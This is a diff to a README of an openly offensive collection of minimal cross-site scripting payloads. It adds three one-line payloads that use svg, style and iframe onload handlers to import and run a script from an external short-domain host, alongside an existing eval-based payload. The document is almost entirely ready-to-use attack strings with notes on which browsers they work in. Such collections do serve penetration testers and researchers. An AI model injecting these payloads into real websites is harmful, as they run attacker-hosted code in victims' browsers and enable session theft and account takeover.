@@ -52,4 +52,16 @@ The DEMO available here: <https://terjanq.github.io/Tiny-XSS-Payloads/index.html
 
 <!-- If inline styles are blocked -->
 <style/onerror=eval(name)>
+
+<!-- Uses external script as import, doesn't work in innerHTML unless Firefox -->
+<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
+<svg/onload=import(/\\Ǌ.₨/)>
+
+<!-- Uses external script as import,  triggers if inline styles are allowed.
+<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
+<style/onload=import(/\\Ǌ.₨/)>
+
+<!-- Uses external script as import -->
+<!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
+<iframe/onload=import(/\\Ǌ.₨/)>
 ```
